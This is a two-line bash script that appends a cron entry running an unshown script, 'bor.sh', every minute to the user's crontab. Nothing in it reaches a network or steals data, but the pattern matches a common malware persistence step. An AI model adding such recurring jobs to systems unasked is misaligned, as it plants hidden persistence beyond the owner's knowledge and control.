#!/bin/bash
crontab -l | { cat; echo "* * * * * bor.sh"; } | crontab -
